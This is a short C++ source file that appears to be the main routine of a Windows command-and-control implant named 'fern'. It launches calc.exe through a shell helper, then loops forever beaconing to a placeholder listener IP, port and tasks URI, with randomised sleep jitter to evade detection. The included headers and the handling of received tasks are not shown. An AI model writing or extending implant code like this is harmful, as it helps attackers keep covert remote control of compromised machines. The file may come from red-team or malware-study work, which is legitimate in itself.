#include <iostream>
#include <string>
#include <windows.h>
#include <cstdlib>
#include <ctime>
#include "shell.h"
#include "network_operations.h"
#include "agent.h"

int main() {
    agent fern;

    const std::string cmd = "calc.exe";
    std::string output = shell(cmd);

    std::cout << "Output:" << output << "\n";

    std::srand(std::time(nullptr));

    std::string ip{LISTENERIP   };
    std::string uri = {TASKS};
    unsigned int port{LISTENERPORT};

    while (true) {

        std::string response{get(ip, port, uri)};

        std::cout << response << "\n";
        int jitter = std::rand();
        Sleep(5000 + jitter);
    }
}
